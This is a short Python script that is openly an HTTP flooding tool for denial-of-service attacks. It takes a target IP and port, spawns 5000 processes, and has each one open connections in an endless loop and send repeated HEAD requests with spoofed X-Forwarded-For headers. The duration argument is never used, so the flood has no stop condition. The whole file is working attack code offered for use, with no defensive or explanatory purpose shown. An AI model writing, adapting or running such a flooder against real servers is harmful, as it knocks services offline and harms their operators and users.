import socket
import os
from time import sleep
import multiprocessing
import random
import platform
import sys

print("Loading System...")
sysOS = platform.system()
print("System Reloading: ", sysOS)

if sysOS == "Linux":
    try:
        os.system("ulimit -n 10300000")
    except Exception as e:
        print(e)
        print("Could not start the script")
else:
    print("Your system is not Linux, You may not be able to run this script in some systems")

def randomip():
    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return randip

def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("Welcome To Penis\n")

ip = sys.argv[1]
port = int(sys.argv[2])
url = f"http://{str(ip)}"
time = int(sys.argv[3])

print("[>] Attack Send! [<]")
sleep(1)

def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

send2attack()




